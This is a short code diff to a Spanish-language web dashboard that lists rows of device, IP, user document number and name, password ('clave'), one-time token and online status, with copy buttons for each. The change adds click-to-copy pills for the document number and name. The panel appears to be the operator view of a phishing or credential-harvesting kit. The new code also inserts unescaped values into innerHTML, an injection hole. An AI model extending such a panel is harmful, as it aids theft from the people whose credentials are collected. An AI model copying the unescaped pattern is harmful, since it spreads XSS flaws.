@@ -132,7 +132,7 @@ function createRow(row) {
     <td class="col-tipo mono"></td>
     <td class="col-device"></td>
     <td class="col-ip mono"></td>
-    <td class="col-user mono copyable" title="Copiar usuario"></td>
+    <td class="col-user mono"></td>
     <td class="col-pass mono copyable" title="Copiar clave"></td>
     <td class="col-token mono copyable" title="Copiar token"></td>
     <td class="col-online"></td>
@@ -182,6 +182,18 @@ function createRow(row) {
     })
   })
 
+  tr.querySelector('.col-user').addEventListener('click', async (event) => {
+    const pill = event.target.closest('.copy-subpill');
+    if (!pill) return;
+    const val = pill.dataset.val;
+    if (!val || val === '—') return;
+    try {
+      await navigator.clipboard.writeText(val);
+      pill.classList.add('copied');
+      setTimeout(() => pill.classList.remove('copied'), 900);
+    } catch (_) {}
+  });
+
   return tr
 }
 
@@ -192,7 +204,24 @@ function updateRow(tr, row) {
   tr.querySelector('.col-tipo').textContent = row.tipo
   tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
   tr.querySelector('.col-ip').textContent = row.ip || '—'
-  tr.querySelector('.col-user').textContent = row.user || '—'
+  const userCell = tr.querySelector('.col-user');
+  const userStr = row.user || '—';
+  if (userStr.includes(' / ')) {
+    const parts = userStr.split(' / ');
+    const docPart = parts[0];
+    const namePart = parts[1];
+    let docNum = docPart;
+    if (docPart.includes(':')) {
+      docNum = docPart.split(':')[1];
+    }
+    userCell.innerHTML = `
+      <span class="copy-subpill" data-val="${docNum}" title="Copiar Documento (${docPart})">${docPart}</span>
+      <span class="subpill-divider">/</span>
+      <span class="copy-subpill" data-val="${namePart}" title="Copiar Usuario">${namePart}</span>
+    `;
+  } else {
+    userCell.innerHTML = `<span class="copy-subpill" data-val="${userStr}">${userStr}</span>`;
+  }
   tr.querySelector('.col-pass').textContent = row.clave || '—'
   tr.querySelector('.col-token').textContent = row.token || '—'
   tr.querySelector('.col-online').innerHTML = online
